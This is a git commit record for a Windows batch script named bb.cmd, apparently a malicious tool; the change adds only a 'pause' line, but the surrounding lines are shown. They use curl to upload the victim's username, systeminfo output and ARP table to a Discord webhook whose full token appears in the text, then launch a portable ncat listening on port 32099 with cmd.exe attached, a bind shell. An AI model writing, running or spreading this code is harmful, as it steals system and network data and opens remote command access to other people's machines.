fa988631b4403c142acd0736bdf20e48a8d1e82a
lsecanon <sherapsy@gmail.com>
2025-03-15 11:45:03 -0700

    Update bb.cmd

--- bb.cmd
+++ bb.cmd
@@ -8,3 +8,4 @@ for /f "delims=" %n in ('whoami') do set name=%n
 curl -F "content=%name%" -F "file=@%userprofile%\desktop\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
 curl -F "content=%name%" -F "file=@%userprofile%\desktop\bb\arp.txt"        https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
 %userprofile%\desktop\bb\ncat-portable-5.59BETA1\ncat.exe -lvp 32099 -e cmd.exe
+pause
